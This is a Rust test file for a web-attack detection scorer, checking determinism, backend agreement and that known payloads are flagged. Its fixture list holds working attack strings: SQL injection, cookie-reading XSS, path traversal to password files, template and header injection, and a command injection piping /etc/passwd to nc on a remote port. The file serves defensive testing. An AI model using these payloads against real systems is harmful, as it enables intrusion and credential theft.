//! End-to-end checks of the public scoring API with the embedded model.

use string2fingerprint::fingerprint::{BLOCK_LEN, MIN_INPUT_LEN, fingerprints, window_count};
use string2fingerprint::{Backend, Category, Scorer, Scores};

/// A small deterministic generator, so that the tests need no dependency.
struct Rng(u64);

impl Rng {
    fn next_u64(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut value = self.0;
        value = (value ^ (value >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        value = (value ^ (value >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        value ^ (value >> 31)
    }

    fn below(&mut self, bound: usize) -> usize {
        usize::try_from(self.next_u64() % bound as u64).unwrap()
    }

    fn bytes(&mut self, len: usize) -> Vec<u8> {
        (0..len).map(|_| self.next_u64().to_le_bytes()[0]).collect()
    }
}

/// Inputs that stress the extractor: every length around the block and
/// window edges, random bytes, long runs of one byte, and escape-heavy text.
fn stress_inputs() -> Vec<Vec<u8>> {
    let mut rng = Rng(7);
    let mut inputs = Vec::new();
    for len in (0..=20).chain([
        BLOCK_LEN - 1,
        BLOCK_LEN,
        BLOCK_LEN + 1,
        2 * BLOCK_LEN - 1,
        2 * BLOCK_LEN,
        2 * BLOCK_LEN + 1,
        3 * BLOCK_LEN,
        5 * BLOCK_LEN + 17,
    ]) {
        inputs.push(rng.bytes(len));
        inputs.push(vec![b'a'; len]);
    }
    for byte in [
        0x00, 0x0A, 0x0D, b'%', b'\\', b'<', b'\'', 0x80, 0xC0, 0xED, 0xF4, 0xFF,
    ] {
        inputs.push(vec![byte; 3 * BLOCK_LEN + 5]);
    }
    for _ in 0..200 {
        // Text drawn from a small alphabet reaches many more n-gram shapes
        // than uniform bytes do.
        const ALPHABET: &[u8] =
            b"aZ09 %\\/.<>'\"&;|$(){}=\r\n\t\x00\x7f\x80\xbf\xc0\xe0\xed\xf0\xff";
        let len = rng.below(1500);
        inputs.push(
            (0..len)
                .map(|_| ALPHABET[rng.below(ALPHABET.len())])
                .collect(),
        );
    }
    inputs
}

#[test]
fn inputs_without_a_window_score_zero() {
    let scorer = Scorer::new();
    for input in [&b""[..], b"a", b"<", b"\x00", b"\xff"] {
        assert!(input.len() < MIN_INPUT_LEN);
        assert_eq!(scorer.score(input), Scores::ZERO);
    }
}

#[test]
fn scoring_accepts_any_bytes_and_is_deterministic() {
    let scorer = Scorer::default();
    for input in stress_inputs() {
        let scores = scorer.score(&input);
        assert_eq!(scores, scorer.score(&input));
        assert_eq!(scores == Scores::ZERO, scores.max().1 == 0);
    }
}

#[test]
fn every_supported_backend_returns_the_same_scores() {
    let reference = Scorer::new().with_backend(Backend::Scalar).unwrap();
    let inputs = stress_inputs();
    let mut compared = 0;
    for &backend in Backend::PREFERENCE {
        let Ok(scorer) = Scorer::new().with_backend(backend) else {
            assert!(!backend.is_supported());
            continue;
        };
        assert_eq!(scorer.backend(), backend);
        for (index, input) in inputs.iter().enumerate() {
            assert_eq!(
                scorer.score(input),
                reference.score(input),
                "backend {backend}, stress input {index}"
            );
        }
        compared += 1;
    }
    // The scalar backend is always compared.
    assert!(compared >= 1);
    assert_eq!(Scorer::new().backend(), Backend::detect());
}

#[test]
fn score_is_the_maximum_over_windows() {
    let scorer = Scorer::new();
    for input in stress_inputs() {
        let mut expected = Scores::ZERO;
        let mut windows = 0;
        for fingerprint in fingerprints(&input) {
            expected = expected.max_with(scorer.score_fingerprint(&fingerprint));
            windows += 1;
        }
        assert_eq!(windows, window_count(input.len()));
        assert_eq!(scorer.score(&input), expected);
    }
}

/// Unambiguous payloads with the category that must flag them.
const ATTACKS: &[(Category, &[u8])] = &[
    (
        Category::SqlInjection,
        b"id=1' UNION SELECT username, password FROM users--",
    ),
    (
        Category::SqlInjection,
        b"name=admin' OR '1'='1' -- &password=x",
    ),
    (
        Category::MarkupInjection,
        b"q=<script>alert(document.cookie)</script>",
    ),
    (
        Category::MarkupInjection,
        b"comment=<img src=x onerror=alert(1)>",
    ),
    (
        Category::PathTraversal,
        b"/download?file=../../../../etc/passwd",
    ),
    (
        Category::PathTraversal,
        b"/static/..%2f..%2f..%2f..%2fetc%2fshadow",
    ),
    (
        Category::CommandInjection,
        b"host=127.0.0.1; cat /etc/passwd | nc 10.0.0.1 4444",
    ),
    (
        Category::TemplateInjection,
        b"name={{7*7}}{{config.__class__.__init__.__globals__}}",
    ),
    (
        Category::HeaderInjection,
        b"en-US\r\nSet-Cookie: session=attacker\r\n\r\n",
    ),
    (
        Category::Malformed,
        b"name=caf\xc3\x00\xff\xfe\x80\x80 au lait",
    ),
    (
        Category::Obfuscation,
        b"q=%2525252e%2525252e%2525252f%252525252e%252525252e",
    ),
];

/// Ordinary request text that no category may flag.
const BENIGN: &[&[u8]] = &[
    b"GET /index.html HTTP/1.1",
    b"/products/42/reviews?page=2&sort=newest",
    b"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    b"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    b"The quick brown fox jumps over the lazy dog.",
    b"first_name=Maria&last_name=Garcia&city=Lisbon",
    b"{\"user\":\"alice\",\"items\":[1,2,3],\"total\":59.97}",
    "오늘 회의는 오후 3시에 시작합니다.".as_bytes(),
    "Grüße aus München, bis nächste Woche!".as_bytes(),
];

/// The threshold of the behavior checks. It is deliberately the midpoint of
/// the score range: the examples are unambiguous, so a model that fails them
/// has regressed badly.
const THRESHOLD: u8 = 128;

#[test]
fn unambiguous_payloads_are_flagged_in_their_category() {
    let scorer = Scorer::new();
    for (index, &(category, payload)) in ATTACKS.iter().enumerate() {
        let scores = scorer.score(payload);
        assert!(
            scores.get(category) >= THRESHOLD,
            "payload {index} scores {} in {category}",
            scores.get(category)
        );
    }
}

#[test]
fn ordinary_text_is_not_flagged() {
    let scorer = Scorer::new();
    for (index, text) in BENIGN.iter().enumerate() {
        let scores = scorer.score(text);
        assert!(
            !scores.any_at_least(THRESHOLD),
            "benign text {index} scores {scores:?}"
        );
    }
}

#[test]
fn padding_does_not_hide_a_payload() {
    let scorer = Scorer::new();
    let (category, payload) = ATTACKS[2];
    let filler = b"The quick brown fox jumps over the lazy dog. ";
    // Slide the payload across block and window edges inside a long input.
    for lead in (0..3 * BLOCK_LEN).step_by(37) {
        let mut input: Vec<u8> = filler.iter().copied().cycle().take(lead).collect();
        input.extend_from_slice(payload);
        input.extend(filler.iter().copied().cycle().take(4 * BLOCK_LEN));
        let score = scorer.score(&input).get(category);
        assert!(score >= THRESHOLD, "lead {lead} scores {score}");
    }
}
